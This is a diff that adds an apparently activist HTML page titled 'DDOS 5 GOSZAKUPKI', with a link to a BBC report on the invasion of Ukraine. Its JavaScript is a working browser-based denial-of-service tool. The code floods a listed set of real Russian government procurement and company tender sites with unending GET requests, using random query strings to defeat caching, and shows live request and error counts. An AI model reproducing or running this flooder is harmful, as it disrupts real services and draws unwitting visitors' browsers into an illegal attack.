@@ -1,0 +1,86 @@
+<head>
+    <title>DDOS 5 GOSZAKUPKI</title>
+</head>
+
+<body>
+
+<h3>Here is the stats of your session (the links and the number of the requests that were sent from
+    your browser):</h3>
+<div id="stats"></div>
+<div id="errors"></div>
+<p>If you missed it, <a href="https://www.bbc.com/news/world-europe-60503037">BBC NEWS: Ukraine
+    conflict: Russian forces attack from three sides</a></p>
+</body>
+<script>
+var targets = {
+"https://zakupki.gov.ru/" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://www.roseltorg.ru/" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://lot-online.ru/" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://gos.etpgpb.ru/" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://www.etp-ets.ru/" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://etpgpb.ru/" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://www.tektorg.ru/" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://www.rts-tender.ru/" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://www.zakupki.ru/" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://zakupki.mos.ru/" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://www.fabrikant.ru/" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://eshoprzd.ru/" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://estp.ru/" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://zakupki.gazprom-neft.ru/" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://www.zakazrf.ru/" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://etpgaz.gazprombank.ru/" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://zakupki.rosneft.ru/" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"http://www.mirconnect.ru/" : { number_of_requests: 0, number_of_errored_responses: 0 },
+}
+var statsEl = document.getElementById('stats');
+function printStats() {
+statsEl.innerHTML = '<table width="100%"><thead><tr><th>URL</th><th>Number of Requests</th><th>Number of Errors</th></tr></thead><tbody>' + Object.entries(targets).map(([target, { number_of_requests, number_of_errored_responses }]) => '<tr><td>' + target + '</td><td>' + number_of_requests + '</td><td>' + number_of_errored_responses + '</td></tr>').join('') + '</tbody></table>'
+}
+setInterval(printStats, 1000);
+var CONCURRENCY_LIMIT = 1000
+var queue = []
+async function fetchWithTimeout(resource, options) {
+const controller = new AbortController();
+const id = setTimeout(() => controller.abort(), options.timeout);
+return fetch(resource, {
+method: 'GET',
+mode: 'no-cors',
+signal: controller.signal
+}).then((response) => {
+clearTimeout(id);
+return response;
+}).catch((error) => {
+clearTimeout(id);
+throw error;
+});
+}
+async function flood(target) {
+for (var i = 0;; ++i) {
+if (queue.length > CONCURRENCY_LIMIT) {
+await queue.shift()
+}
+rand = i % 3 === 0 ? '' : ('?' + Math.random() * 1000)
+queue.push(
+fetchWithTimeout(target+rand, { timeout: 1000 })
+.catch((error) => {
+if (error.code === 20 /* ABORT */) {
+return;
+}
+targets[target].number_of_errored_responses++;
+})
+.then((response) => {
+if (response && !response.ok) {
+targets[target].number_of_errored_responses++;
+}
+targets[target].number_of_requests++;
+})
+)
+}
+}
+
+Object.keys(targets).map(flood)
+</script>
+
+
+
+
